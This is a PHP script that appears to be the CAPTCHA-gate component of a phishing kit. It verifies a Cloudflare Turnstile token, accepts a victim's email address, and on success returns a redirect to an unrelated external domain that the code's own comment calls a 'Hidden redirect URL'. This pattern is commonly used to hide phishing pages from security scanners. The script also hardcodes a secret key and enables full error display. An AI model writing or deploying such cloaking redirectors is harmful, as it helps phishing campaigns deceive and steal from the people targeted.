<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json');

// Decode JSON input data
$data = json_decode(file_get_contents('php://input'), true);
$turnstileResponse = $data['token'];
$email = $data['email'];
$secretKey = '0x4AAAAAAAzbaFyF5jnLHaBSyZ5AuNHu098'; // Replace with your actual Cloudflare Turnstile Secret Key

// Prepare data for validation
$validationData = [
    'secret' => $secretKey,
    'response' => $turnstileResponse,
    'remoteip' => $_SERVER['REMOTE_ADDR']
];

// Send CAPTCHA validation request to Cloudflare
$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($validationData)
    ]
];

$context  = stream_context_create($options);
$verify = file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
$captchaSuccess = json_decode($verify);

// Respond with the redirect URL if CAPTCHA is valid
if ($captchaSuccess->success) {
    echo json_encode([
        'success' => true,
        'redirectUrl' => 'https://distribpalmas.com/s2wP/#X' // Hidden redirect URL
    ]);
} else {
    echo json_encode(['success' => false]);
}
?>
